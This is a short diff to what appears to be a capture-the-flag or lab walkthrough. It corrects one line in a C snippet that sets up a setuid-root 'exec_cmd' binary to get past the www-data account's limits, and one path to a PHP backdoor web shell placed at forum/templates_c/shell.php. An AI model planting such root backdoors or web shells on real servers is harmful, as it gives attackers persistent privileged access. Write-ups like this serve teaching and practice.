@@ -13,7 +13,7 @@ But in this case, we have some problems. The apache2 server is running as www-da
 To bypass this, we will make a binary `exec_cmd` with the suid/sgid root for executing commands
 
 ```c
-#include <stdio.h>backdoor binary
+#include <stdio.h>
 
 int main(int ac, char **av) {
     setuid(0);
@@ -112,7 +112,7 @@ $ cat > /var/www/forum/templates_c/shell.php << EOF
 EOF
 ```
 
-We have our php backdoor with a nice terminal emulation on the page `/var/www/forum/templates_c/shell.php`
+We have our php backdoor with a nice terminal emulation on the page `forum/templates_c/shell.php`
 
 ![screen](../img/screen_p0wny.png)
 
